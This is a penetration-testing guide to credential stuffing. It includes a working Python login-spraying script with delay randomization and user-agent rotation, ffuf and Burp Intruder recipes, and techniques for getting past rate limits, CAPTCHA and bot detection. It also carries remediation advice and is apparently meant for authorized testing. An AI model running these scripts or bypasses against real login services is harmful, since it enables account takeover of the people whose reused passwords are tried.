# Credential Stuffing Testing

## Overview
Credential stuffing is an attack that uses previously breached username/password pairs to gain unauthorized access to accounts on other services. It exploits password reuse across multiple platforms. Testing evaluates an application's resilience against automated login attempts using known compromised credentials, its ability to detect and block such attacks, and the effectiveness of account takeover prevention mechanisms.

## Classification
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-521 (Weak Password Requirements), CWE-308 (Use of Single-factor Authentication)
- **OWASP:** A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 7.5 - 9.8 (High to Critical)
- **MITRE ATT&CK:** T1110.004 (Credential Stuffing)

## Detection Methodology

### 1. Credential Reuse Assessment
Evaluate the target's exposure to credential reuse attacks:
```
Pre-engagement intelligence:
- Check HaveIBeenPwned API for domain breach exposure
- Identify prior breaches involving the target organization
- Assess the target user population size and password policy history
- Review public breach databases for leaked credentials (authorized testing only)

API check:
  curl -s "https://haveibeenpwned.com/api/v3/breaches" \
    -H "hibp-api-key: <key>" | jq '.[].Name'

Domain search:
  curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com" \
    -H "hibp-api-key: <key>"
```

### 2. Authentication Flow Analysis
Map the full authentication flow before testing:
```
Identify:
- Login endpoint URL, method, and parameters
- CSRF token requirements and rotation
- Session management (cookies, tokens, headers)
- CAPTCHA implementation (if any) and trigger conditions
- Multi-factor authentication prompts and bypass potential
- Account lockout behavior and thresholds
- Response differences between valid/invalid credentials
- JavaScript-based bot detection (fingerprinting, behavioral analysis)
- API endpoints that accept credentials (REST, GraphQL, SOAP)
```

### 3. Automation Detection Bypass Testing
Test what defenses exist and whether they can be circumvented:

**Bot detection mechanisms to test:**
```
CAPTCHA:
- Is CAPTCHA present on first attempt or only after failures?
- Can CAPTCHA be bypassed with OCR (Tesseract, anti-captcha services)?
- Does solving one CAPTCHA allow unlimited subsequent attempts?
- Is CAPTCHA validated server-side or client-side only?

JavaScript challenges:
- Are headless browsers detected? (navigator.webdriver property)
- Is browser fingerprinting used? (canvas, WebGL, fonts)
- Are behavioral biometrics tracked? (mouse movement, typing cadence)

Rate limiting:
- Per-IP, per-account, per-session, or global?
- Does rate limiting reset on success?
- Can it be bypassed with header manipulation?
  X-Forwarded-For, X-Real-IP, X-Originating-IP

Device fingerprinting:
- Are new device logins flagged or challenged?
- Can device fingerprints be replayed from previous sessions?
- Is the device fingerprint stored in a cookie that can be reused?
```

### 4. Credential Stuffing Simulation
```bash
# Prepare credential pairs (username:password format)
# Use ONLY authorized test credentials or synthetic breach lists

# Test with curl for manual verification
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test@example.com","password":"Password123"}' \
  -w "\n%{http_code} %{time_total}s"

# Compare response for valid vs invalid credentials
# Look for: status codes, response body, Set-Cookie headers, redirects
```

### 5. Account Takeover (ATO) Methodology
After successful credential stuffing, test post-login protections:
```
1. Can the attacker change the account email without verification?
2. Can the attacker change the password without knowing the current one?
3. Can the attacker add/change MFA settings?
4. Are active sessions invalidated on password change?
5. Is the legitimate user notified of new device/location login?
6. Can the attacker access sensitive data (PII, payment info) immediately?
7. Are there step-up authentication requirements for sensitive operations?
8. Can the attacker link the account to external OAuth providers?
```

## Tool Usage

### Custom Python Script (Authorized Testing)
```python
import requests
import time
import random

def credential_stuff(target_url, cred_file, delay_range=(1, 3)):
    """
    Credential stuffing simulation for authorized testing only.
    Uses randomized delays and rotating user agents.
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ]

    session = requests.Session()
    results = {"success": [], "failed": 0, "blocked": 0}

    with open(cred_file, 'r') as f:
        for line in f:
            username, password = line.strip().split(':', 1)
            headers = {"User-Agent": random.choice(user_agents)}

            # Get CSRF token if needed
            login_page = session.get(target_url, headers=headers)
            # Extract CSRF token from response...

            resp = session.post(target_url,
                data={"username": username, "password": password},
                headers=headers,
                allow_redirects=False)

            if resp.status_code == 302:  # successful login redirect
                results["success"].append(username)
            elif resp.status_code == 429:  # rate limited
                results["blocked"] += 1
            else:
                results["failed"] += 1

            time.sleep(random.uniform(*delay_range))

    return results
```

### Burp Suite Configuration
```
1. Capture login request in Proxy
2. Send to Intruder → select Pitchfork attack type
3. Mark username and password fields as injection points
4. Payload Set 1: usernames from breach list
5. Payload Set 2: corresponding passwords from breach list
6. Resource Pool: limit concurrent requests (2-5) to avoid detection
7. Grep - Match: set success indicators (dashboard, welcome, 302)
8. Grep - Extract: extract response tokens for analysis
9. Monitor results for anomalous response sizes or status codes
```

### ffuf for Credential Stuffing
```bash
# Using colon-separated credential file
ffuf -u https://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=USERFUZZ&password=PASSFUZZ" \
  -w credentials.txt:USERFUZZ \
  -w credentials.txt:PASSFUZZ \
  -mode pitchfork \
  -rate 5 \
  -mc 302 -fc 401,403

# Note: ffuf pitchfork mode requires parallel wordlists
# Split credentials file into separate user and password files
```

### Detection Validation
```bash
# Monitor for defensive responses during testing:

# 1. CAPTCHA triggered after N attempts
# 2. IP block / 429 Too Many Requests
# 3. Account lockout messages
# 4. Additional verification challenges (email, SMS)
# 5. WAF blocks (403 with Cloudflare/Akamai challenge page)
# 6. Behavioral analysis blocks (JavaScript challenge pages)
# 7. Anomaly detection alerts in SIEM (verify with blue team)
```

## Breach Database Awareness
```
Common breach sources (for defensive awareness and authorized testing):
- HaveIBeenPwned (legitimate API for checking exposure)
- Breach compilation lists (Collection #1-5)
- Combo lists from underground forums
- Domain-specific breaches (LinkedIn, Adobe, Yahoo, etc.)
- Paste sites (Pastebin, Ghostbin) — automated monitoring

Credential format normalization:
- email:password
- username:password
- email:hash (requires cracking first)
- domain\username:password
- Deduplicate and normalize before testing
```

## Remediation
1. **Implement breached password detection** -- check passwords against HaveIBeenPwned API on registration and login
2. **Deploy multi-factor authentication** -- FIDO2/WebAuthn preferred, TOTP acceptable
3. **Use adaptive authentication** -- challenge logins from new devices, locations, or IPs
4. **Implement bot detection** -- behavioral analysis, JavaScript challenges, device fingerprinting
5. **Rate limit authentication endpoints** -- per-IP and per-account with exponential backoff
6. **Monitor for credential stuffing patterns** -- high failure rates from single IP or against single account
7. **Notify users of suspicious login activity** -- email alerts for new device/location
8. **Implement step-up authentication** -- re-verify identity for sensitive actions (password change, payment)
9. **Invalidate sessions on password change** -- force re-authentication everywhere
10. **Deploy CAPTCHA intelligently** -- trigger after anomalous patterns, not on every attempt
11. **Encourage password managers** -- reduce password reuse across services

## Evidence Collection
When documenting credential stuffing findings:
- Authentication endpoint details and flow description
- Bot detection mechanisms present (or absent) and bypass feasibility
- Rate limiting configuration and observed thresholds
- CAPTCHA implementation details and circumvention methods tested
- Number of test credentials attempted and success rate
- Account takeover protections evaluated (MFA, notifications, step-up auth)
- Response analysis showing how success/failure can be distinguished
- Defensive gaps prioritized by exploitability and impact
- Recommendations with implementation effort estimates
- Timeline of testing activity for correlation with defensive monitoring
